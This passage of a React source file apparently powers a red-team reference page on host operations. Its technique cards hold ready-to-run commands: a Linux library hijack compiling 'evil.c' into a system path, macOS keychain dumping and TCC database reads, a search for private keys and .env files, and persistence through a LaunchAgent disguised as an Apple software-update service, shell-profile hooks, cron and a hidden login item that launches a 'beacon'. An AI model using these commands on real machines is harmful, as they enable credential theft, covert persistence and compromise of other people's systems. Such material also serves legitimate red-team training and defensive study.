gcc -shared -fPIC -o /lib/x86_64-linux-gnu/libutil_helper.so.1 evil.c
echo '/lib/x86_64-linux-gnu/libutil_helper.so.1' >> /etc/ld.so.conf.d/helper.conf
ldconfig`
      }
    ]
  },
];

const macOSTechniques = [
  {
    id: 'macos-recon',
    title: 'macOS Recon & Keychain',
    subtitle: 'Gather situational awareness on a compromised macOS host and extract Keychain credentials',
    tags: ['system_profiler', 'osquery', 'keychain', 'TCC', 'security', 'SwiftBelt'],
    accentColor: 'purple',
    overview: 'macOS host reconnaissance identifies the OS version, running processes, AV/EDR agents (CrowdStrike Falcon, Carbon Black, Jamf), and TCC (Transparency Consent Control) permissions. The login keychain stores Wi-Fi passwords, website credentials, and application secrets — accessible to the logged-in user without a password prompt. SwiftBelt is the macOS equivalent of Seatbelt.',
    steps: [
      'system_profiler SPSoftwareDataType: gather OS version, hostname, uptime, and user info',
      'id, groups, sudo -l: check current user context and privilege level',
      'List running processes: ps auxf — identify AV/EDR agents (CrowdStrike Falcon, Jamf, Carbon Black)',
      'TCC database: /Library/Application Support/com.apple.TCC/TCC.db — check what apps have Accessibility/Camera/Disk access',
      'Keychain access: the login keychain stores WiFi passwords, website creds, and app secrets — access as current user',
      'SwiftBelt: macOS equivalent of Seatbelt — enumerates host data, history, SSH keys, browser creds',
    ],
    commands: [
      {
        title: 'macOS situational awareness',
        code: `# Basic recon
id && groups && sudo -l
system_profiler SPSoftwareDataType SPHardwareDataType
uname -a && sw_vers
hostname && ifconfig

# Running processes and network
ps auxf
lsof -i -n -P | grep LISTEN

# TCC (Transparency, Consent, Control) — app permissions
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "select client,service,auth_value from access"
# auth_value 2 = granted

# Users and groups
dscl . list /Users | grep -v '^_'
dscl . -read /Users/$USER

# Keychain dump (as current user — no root needed)
security dump-keychain -d login.keychain-db
# or interactively:
security find-generic-password -ga "Wi-Fi" 2>&1 | grep password
security find-internet-password -a username@example.com -s example.com -w

# SwiftBelt — automated macOS recon
./SwiftBelt   # Enumerates users, SSH keys, browser data, Slack tokens, etc.

# LaunchAgents/Daemons — check for persistence
ls ~/Library/LaunchAgents/
ls /Library/LaunchAgents/
ls /Library/LaunchDaemons/

# Interesting files
find /Users -name "*.pem" -o -name "id_rsa" -o -name ".env" 2>/dev/null
find /Applications -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null`
      }
    ]
  },
  {
    id: 'macos-persistence',
    title: 'macOS Persistence',
    subtitle: 'Establish persistence on macOS via LaunchAgents, LaunchDaemons, cron, and shell hooks',
    tags: ['LaunchAgent', 'LaunchDaemon', 'plist', 'cron', 'bashrc', 'zshrc', 'login items'],
    accentColor: 'red',
    overview: 'macOS persistence uses Apple\'s Launch Services framework. LaunchAgents in ~/Library/LaunchAgents/ run as the current user on login — no admin required. LaunchDaemons in /Library/LaunchDaemons/ require root and run at boot. A convincingly named plist (com.apple.softwareupdate.plist) with RunAtLoad=true and KeepAlive=true provides reliable, auto-restarting persistence. Shell hooks via .zshrc (default shell on modern macOS) fire on every terminal open.',
    steps: [
      'LaunchAgents (user-level): plist in ~/Library/LaunchAgents/ — runs on user login without admin rights',
      'LaunchDaemons (root): plist in /Library/LaunchDaemons/ — runs at boot as root, requires admin',
      'Login Items: add binary via osascript or System Preferences — less stealthy but persistent',
      'Shell hooks: append payload to ~/.zshrc or ~/.bash_profile — runs on every terminal open',
      'Cron: add entry to crontab — runs as current user, no GUI prompt',
      'Evasion: name plist files convincingly (com.apple.softwareupdate.plist) and use RunAtLoad + KeepAlive',
    ],
    commands: [
      {
        title: 'macOS persistence techniques',
        code: `# LaunchAgent (user-level, no admin)
cat > ~/Library/LaunchAgents/com.apple.softwareupdate.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/$USER/.hidden/beacon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist

# LaunchDaemon (root — runs at boot)
sudo cp com.apple.networkd.plist /Library/LaunchDaemons/
sudo launchctl load /Library/LaunchDaemons/com.apple.networkd.plist

# Shell hook (zsh default on macOS)
echo 'nohup /tmp/.hidden/beacon &>/dev/null &' >> ~/.zshrc
echo 'nohup /tmp/.hidden/beacon &>/dev/null &' >> ~/.bash_profile

# Cron
(crontab -l 2>/dev/null; echo "* * * * * /tmp/.hidden/beacon") | crontab -

# Login Item via osascript
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/tmp/.hidden/beacon", hidden:true}'

# Verify persistence
launchctl list | grep softwareupdate
crontab -l`
      }
    ]
  },
];

export default function HostOperations() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Host </span><span className="text-purple-400">Operations</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Seatbelt • Keylogging • Persistence • COM Hijacking • Services • macOS</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {[
          // Purple (Host Recon) group
          ...techniques.filter(t => t.accentColor === 'purple'),
          ...linuxTechniques.filter(t => t.accentColor === 'purple'),
          ...macOSTechniques.filter(t => t.accentColor === 'purple'),
          // Blue (User Persistence) group
          ...techniques.filter(t => t.accentColor === 'blue'),
          // Red (Elevated Persistence) group
          ...techniques.filter(t => t.accentColor === 'red'),
          ...linuxTechniques.filter(t => t.accentColor === 'red'),
          ...macOSTechniques.filter(t => t.accentColor === 'red'),
        ].filter(Boolean).map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}